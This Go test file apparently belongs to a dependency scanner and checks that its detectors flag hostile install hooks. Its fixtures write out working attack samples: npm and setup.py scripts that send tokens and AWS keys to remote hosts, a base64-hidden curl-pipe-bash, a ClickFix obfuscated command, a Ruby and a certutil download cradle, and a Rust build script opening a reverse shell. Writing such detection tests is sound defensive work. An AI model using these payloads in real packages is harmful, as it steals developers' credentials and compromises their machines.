package adversarial_test

import (
	"strings"
	"testing"

	"ihbv.io/depsnort/internal/check"
	"ihbv.io/depsnort/internal/check/builtin"
	"ihbv.io/depsnort/internal/finding"
	"ihbv.io/depsnort/internal/graph"
	"ihbv.io/depsnort/internal/installsurface"
)

// buildPyGraph constructs a graph with a root project and one PyPI dependency
// whose setup.py content is analyzed for install-time hooks.
func buildPyGraph(depName, depVersion, setupPy string) *graph.Graph {
	g := graph.New()
	root := g.AddNode(&graph.Node{
		ID: "pkg:pypi/test-project@0.0.0", Ecosystem: "pypi",
		Name: "test-project", Version: "0.0.0",
	})
	g.MarkRoot(root.ID)

	dep := g.AddNode(&graph.Node{
		ID: "pkg:pypi/" + depName + "@" + depVersion, Ecosystem: "pypi",
		Name: depName, Version: depVersion, Direct: true, Depth: 1,
	})
	g.AddEdge(root.ID, dep.ID, graph.EdgeDependsOn)

	surface := installsurface.AnalyzePython(setupPy, "", nil)
	for _, h := range surface.Hooks {
		hookID := "hook:" + dep.ID + "#" + strings.ReplaceAll(h.Name, ":", "_")
		hookNode := g.AddNode(&graph.Node{
			ID: hookID, Kind: graph.KindInstallHook, Ecosystem: "pypi",
			Name: h.Name, Depth: dep.Depth,
			Attr: map[string]string{
				"hook.command": h.Command,
				"hook.package": dep.ID,
			},
		})
		for _, c := range h.Caps {
			hookNode.Attr["cap."+string(c)] = "true"
		}
		if len(h.Evidence) > 0 {
			hookNode.Attr["hook.evidence"] = strings.Join(h.Evidence, ",")
		}
		g.AddEdge(dep.ID, hookID, graph.EdgeDeclaresHook)
	}
	return g
}

// buildNpmGraph constructs a graph with a root project and one npm dependency
// with hasInstallScript and an analyzed install surface from the given script.
func buildNpmGraph(depName, depVersion, scriptName, scriptCmd, scriptSource string) *graph.Graph {
	g := graph.New()
	root := g.AddNode(&graph.Node{
		ID: "pkg:npm/test-project@0.0.0", Ecosystem: "npm",
		Name: "test-project", Version: "0.0.0",
	})
	g.MarkRoot(root.ID)

	dep := g.AddNode(&graph.Node{
		ID: "pkg:npm/" + depName + "@" + depVersion, Ecosystem: "npm",
		Name: depName, Version: depVersion, Direct: true, Depth: 1,
		Attr: map[string]string{"npm.hasInstallScript": "true"},
	})
	g.AddEdge(root.ID, dep.ID, graph.EdgeDependsOn)

	scripts := map[string]string{scriptName: scriptCmd}
	var reader installsurface.FileReader
	if scriptSource != "" {
		reader = func(rel string) ([]byte, bool) {
			return []byte(scriptSource), true
		}
	}
	surface := installsurface.Analyze(scripts, reader)
	for _, h := range surface.Hooks {
		hookID := "hook:" + dep.ID + "#" + h.Name
		hookNode := g.AddNode(&graph.Node{
			ID: hookID, Kind: graph.KindInstallHook, Ecosystem: "npm",
			Name: h.Name, Depth: dep.Depth,
			Attr: map[string]string{
				"hook.command": h.Command,
				"hook.package": dep.ID,
			},
		})
		for _, c := range h.Caps {
			hookNode.Attr["cap."+string(c)] = "true"
		}
		if len(h.Evidence) > 0 {
			hookNode.Attr["hook.evidence"] = strings.Join(h.Evidence, ",")
		}
		g.AddEdge(dep.ID, hookID, graph.EdgeDeclaresHook)

		for _, a := range h.Artifacts {
			artID := "artifact:" + dep.ID + "#" + a.Ref
			an := g.AddNode(&graph.Node{
				ID: artID, Kind: graph.KindReferencedArtifact, Ecosystem: "npm",
				Name: a.Ref, Depth: dep.Depth,
				Attr: map[string]string{
					"artifact.remote": boolStr(a.Remote),
					"artifact.read":   boolStr(a.Read),
					"hook.package":    dep.ID,
				},
			})
			for _, c := range a.Caps {
				an.Attr["cap."+string(c)] = "true"
			}
			if len(a.Evidence) > 0 {
				an.Attr["artifact.evidence"] = strings.Join(a.Evidence, ",")
			}
			if a.Remote {
				g.AddEdge(hookID, artID, graph.EdgeHookFetches)
			} else {
				g.AddEdge(hookID, artID, graph.EdgeHookExecs)
			}
		}

		for _, sk := range h.Sinks {
			sinkID := "sink:" + dep.ID + "#" + sk.Name
			g.AddNode(&graph.Node{
				ID: sinkID, Kind: graph.KindSink, Ecosystem: "npm",
				Name: sk.Name, Depth: dep.Depth,
				Attr: map[string]string{
					"sink.evidence": sk.Evidence,
					"hook.package":  dep.ID,
				},
			})
			g.AddEdge(hookID, sinkID, graph.EdgeHookReadsEnv)
		}
	}
	return g
}

func boolStr(b bool) string {
	if b {
		return "true"
	}
	return "false"
}

func runChecks(g *graph.Graph) []finding.Finding {
	reg := check.NewRegistry(
		builtin.HookPresent{},
		builtin.HookNetwork{},
		builtin.HookCredentials{},
		builtin.HookExfilCapable{},
		builtin.HookObfuscated{},
	)
	return reg.RunAll(&check.Context{Graph: g})
}

func hasCheck(findings []finding.Finding, checkID string) bool {
	for _, f := range findings {
		if f.CheckID == checkID {
			return true
		}
	}
	return false
}

func findingsForCheck(findings []finding.Finding, checkID string) []finding.Finding {
	var out []finding.Finding
	for _, f := range findings {
		if f.CheckID == checkID {
			out = append(out, f)
		}
	}
	return out
}

// =============================================================================
// Attack 1: ua-parser-js style — npm postinstall downloads and executes payload
// =============================================================================
func TestAttack_NpmPostinstallExfil(t *testing.T) {
	scriptSource := `
const https = require('https');
const child_process = require('child_process');
const os = require('os');

https.get('https://citationsherbe.at/sdd.dll', (res) => {
  const f = require('fs').createWriteStream(os.tmpdir() + '/sdd.dll');
  res.pipe(f);
  f.on('finish', () => { child_process.execSync(os.tmpdir() + '/sdd.dll'); });
});

const data = JSON.stringify({
  npm: process.env.NPM_TOKEN,
  gh: process.env.GITHUB_TOKEN,
  host: os.hostname()
});
const req = https.request({hostname:'citationsherbe.at',path:'/e',method:'POST'}, ()=>{});
req.write(data);
req.end();
`
	g := buildNpmGraph("adversarial-exfil", "1.0.0", "preinstall", "node preinstall.js", scriptSource)
	findings := runChecks(g)

	if !hasCheck(findings, "VC-002a") {
		t.Error("MISS: VC-002a (install hook present) not detected")
	}
	if !hasCheck(findings, "VC-002d") {
		t.Error("MISS: VC-002d (exfil-capable: network + creds) not detected")
	}

	t.Logf("Findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s [%s/%s]: %s", f.CheckID, f.Severity, f.GateClass, f.Title)
	}
}

// =============================================================================
// Attack 2: ctx PyPI style — setup.py exfiltrates env vars at install time
// =============================================================================
func TestAttack_PyPICtxExfil(t *testing.T) {
	setupPy := `
import os
import urllib.request
import json

data = {
    "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
    "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
    "gh_token": os.environ.get("GITHUB_TOKEN", ""),
}

req = urllib.request.Request(
    "https://anti-theft-web.herokuapp.com/hacked",
    data=json.dumps(data).encode(),
)
urllib.request.urlopen(req)

from setuptools import setup
setup(name="adversarial-ctx", version="1.0.0")
`
	g := buildPyGraph("adversarial-ctx", "1.0.0", setupPy)
	findings := runChecks(g)

	if !hasCheck(findings, "VC-002d") {
		t.Error("MISS: VC-002d (exfil-capable: network + creds) not detected")
	}

	t.Logf("Findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s [%s/%s]: %s", f.CheckID, f.Severity, f.GateClass, f.Title)
	}
}

// =============================================================================
// Attack 3: event-stream style — base64-obfuscated payload in npm postinstall
// =============================================================================
func TestAttack_NpmObfuscatedPayload(t *testing.T) {
	scriptSource := `
const cp = require('child_process');
const encoded = 'Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==';
const decoded = Buffer.from(encoded, 'base64').toString('utf-8');
cp.execSync(decoded, { stdio: 'ignore' });

const n = Buffer.from('aHR0cHM6Ly9jb2xsZWN0b3IuZXZpbC5jb20vaW5nZXN0', 'base64').toString('utf-8');
const https = require('https');
const data = JSON.stringify({ token: process.env.NPM_TOKEN, keys: process.env.AWS_SECRET_ACCESS_KEY });
https.request(n, { method: 'POST' }, () => {}).end(data);
`
	g := buildNpmGraph("adversarial-obfuscated", "1.0.0", "postinstall", "node index.js", scriptSource)
	findings := runChecks(g)

	if !hasCheck(findings, "VC-002a") {
		t.Error("MISS: VC-002a (install hook) not detected")
	}
	if !hasCheck(findings, "VC-002e") {
		t.Error("MISS: VC-002e (obfuscation + exec) not detected")
	}
	if !hasCheck(findings, "VC-002d") {
		t.Error("MISS: VC-002d (exfil-capable: network + creds) not detected")
	}

	t.Logf("Findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s [%s/%s]: %s", f.CheckID, f.Severity, f.GateClass, f.Title)
	}
}

// =============================================================================
// Attack 4: ClickFix-style — caret obfuscation + wildcard exe discovery
// =============================================================================
func TestAttack_ClickFixEvasion(t *testing.T) {
	scriptSource := `cmd.exe /c start "" /min cmd /v:on /k "set bufX=where c*u*r*l.e?e&set ldrY=where p*ell.exe&for /f %i in ('where c*d.e?e')do %i /c "for /f %k in ('!bufX!')do %k h^t^t^p^s^:^/^/^m^a^l^w^a^r^e^.^l^o^l^/^p|for /f %j in ('!ldrY!')do %j -WindowStyle Hidden""`
	g := buildNpmGraph("adversarial-clickfix", "1.0.0", "postinstall", "node run.js", scriptSource)
	findings := runChecks(g)

	if !hasCheck(findings, "VC-002e") {
		t.Error("MISS: VC-002e (obfuscation + exec) not detected")
	}

	// Verify the obfuscation evidence includes our new markers
	for _, f := range findingsForCheck(findings, "VC-002e") {
		ev := f.Evidence
		if !strings.Contains(ev, "obfuscated-scheme") {
			t.Errorf("missing obfuscated-scheme in evidence: %s", ev)
		}
		if !strings.Contains(ev, "wildcard-exe") {
			t.Errorf("missing wildcard-exe in evidence: %s", ev)
		}
		if !strings.Contains(ev, "cmd-delayed-expansion") {
			t.Errorf("missing cmd-delayed-expansion in evidence: %s", ev)
		}
	}

	t.Logf("Findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s [%s/%s]: %s", f.CheckID, f.Severity, f.GateClass, f.Title)
	}
}

// =============================================================================
// Attack 5: Ruby extconf.rb — downloads and executes payload during gem install
// =============================================================================
func TestAttack_GemExtconfPayload(t *testing.T) {
	extconf := `
require 'mkmf'
require 'net/http'
require 'uri'

payload_uri = URI.parse("https://evil.com/linux-payload")
response = Net::HTTP.get(payload_uri)

system("chmod +x /tmp/payload && /tmp/payload")

creds = ENV.select { |k, _| k =~ /TOKEN|KEY|SECRET/i }
uri = URI.parse("https://evil.com/exfil")
Net::HTTP.post(uri, creds.to_json)

create_makefile('native_ext')
`
	g := graph.New()
	root := g.AddNode(&graph.Node{
		ID: "pkg:gem/test-project@0.0.0", Ecosystem: "gem",
		Name: "test-project", Version: "0.0.0",
	})
	g.MarkRoot(root.ID)
	dep := g.AddNode(&graph.Node{
		ID: "pkg:gem/adversarial-gem@1.0.0", Ecosystem: "gem",
		Name: "adversarial-gem", Version: "1.0.0", Direct: true, Depth: 1,
	})
	g.AddEdge(root.ID, dep.ID, graph.EdgeDependsOn)

	surface := installsurface.AnalyzeRuby(extconf, "")
	for _, h := range surface.Hooks {
		hookID := "hook:" + dep.ID + "#" + h.Name
		hookNode := g.AddNode(&graph.Node{
			ID: hookID, Kind: graph.KindInstallHook, Ecosystem: "gem",
			Name: h.Name, Depth: dep.Depth,
			Attr: map[string]string{
				"hook.command": h.Command,
				"hook.package": dep.ID,
			},
		})
		for _, c := range h.Caps {
			hookNode.Attr["cap."+string(c)] = "true"
		}
		if len(h.Evidence) > 0 {
			hookNode.Attr["hook.evidence"] = strings.Join(h.Evidence, ",")
		}
		g.AddEdge(dep.ID, hookID, graph.EdgeDeclaresHook)
	}

	findings := runChecks(g)

	if !hasCheck(findings, "VC-002b") {
		t.Error("MISS: VC-002b (network egress) not detected")
	}

	t.Logf("Findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s [%s/%s]: %s", f.CheckID, f.Severity, f.GateClass, f.Title)
	}
}

// =============================================================================
// Attack 6: Cargo build.rs — credential theft via TcpStream
// =============================================================================
func TestAttack_CargoBuildRsExfil(t *testing.T) {
	buildRs := `
use std::env;
use std::net::TcpStream;
use std::io::Write;
use std::process::Command;

fn main() {
    let token = env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    let gh = env::var("GITHUB_TOKEN").unwrap_or_default();

    if let Ok(mut stream) = TcpStream::connect("evil.com:443") {
        let body = format!("cargo={}&gh={}", token, gh);
        let _ = stream.write_all(body.as_bytes());
    }

    let _ = Command::new("bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/evil.com/4444 0>&1")
        .output();
}
`
	g := graph.New()
	root := g.AddNode(&graph.Node{
		ID: "pkg:cargo/test-project@0.0.0", Ecosystem: "cargo",
		Name: "test-project", Version: "0.0.0",
	})
	g.MarkRoot(root.ID)
	dep := g.AddNode(&graph.Node{
		ID: "pkg:cargo/adversarial-crate@1.0.0", Ecosystem: "cargo",
		Name: "adversarial-crate", Version: "1.0.0", Direct: true, Depth: 1,
	})
	g.AddEdge(root.ID, dep.ID, graph.EdgeDependsOn)

	surface := installsurface.AnalyzeRust(buildRs)
	for _, h := range surface.Hooks {
		hookID := "hook:" + dep.ID + "#" + h.Name
		hookNode := g.AddNode(&graph.Node{
			ID: hookID, Kind: graph.KindInstallHook, Ecosystem: "cargo",
			Name: h.Name, Depth: dep.Depth,
			Attr: map[string]string{
				"hook.command": h.Command,
				"hook.package": dep.ID,
			},
		})
		for _, c := range h.Caps {
			hookNode.Attr["cap."+string(c)] = "true"
		}
		if len(h.Evidence) > 0 {
			hookNode.Attr["hook.evidence"] = strings.Join(h.Evidence, ",")
		}
		g.AddEdge(dep.ID, hookID, graph.EdgeDeclaresHook)
	}

	findings := runChecks(g)

	if !hasCheck(findings, "VC-002d") {
		t.Error("MISS: VC-002d (exfil-capable: network + creds) not detected — reads CARGO_REGISTRY_TOKEN, GITHUB_TOKEN")
	}

	t.Logf("Findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s [%s/%s]: %s", f.CheckID, f.Severity, f.GateClass, f.Title)
	}
}

// =============================================================================
// Attack 7: Composer plugin — certutil download cradle
// =============================================================================
func TestAttack_ComposerPluginCradle(t *testing.T) {
	scripts := map[string]string{
		"post-install-cmd": `certutil -urlcache -split -f https://evil.com/payload.exe %TEMP%\payload.exe && %TEMP%\payload.exe`,
	}
	g := graph.New()
	root := g.AddNode(&graph.Node{
		ID: "pkg:composer/test/project@0.0.0", Ecosystem: "composer",
		Name: "test/project", Version: "0.0.0",
	})
	g.MarkRoot(root.ID)
	dep := g.AddNode(&graph.Node{
		ID: "pkg:composer/adversarial/plugin@1.0.0", Ecosystem: "composer",
		Name: "adversarial/plugin", Version: "1.0.0", Direct: true, Depth: 1,
	})
	g.AddEdge(root.ID, dep.ID, graph.EdgeDependsOn)

	surface := installsurface.AnalyzePHP(scripts, "composer-plugin", "")
	for _, h := range surface.Hooks {
		hookID := "hook:" + dep.ID + "#" + strings.ReplaceAll(h.Name, ":", "_")
		hookNode := g.AddNode(&graph.Node{
			ID: hookID, Kind: graph.KindInstallHook, Ecosystem: "composer",
			Name: h.Name, Depth: dep.Depth,
			Attr: map[string]string{
				"hook.command": h.Command,
				"hook.package": dep.ID,
			},
		})
		for _, c := range h.Caps {
			hookNode.Attr["cap."+string(c)] = "true"
		}
		if len(h.Evidence) > 0 {
			hookNode.Attr["hook.evidence"] = strings.Join(h.Evidence, ",")
		}
		g.AddEdge(dep.ID, hookID, graph.EdgeDeclaresHook)
	}

	findings := runChecks(g)

	if !hasCheck(findings, "VC-002b") {
		t.Error("MISS: VC-002b (network egress) not detected — certutil is a LOLBin download cradle")
	}

	t.Logf("Findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s [%s/%s]: %s", f.CheckID, f.Severity, f.GateClass, f.Title)
	}
}
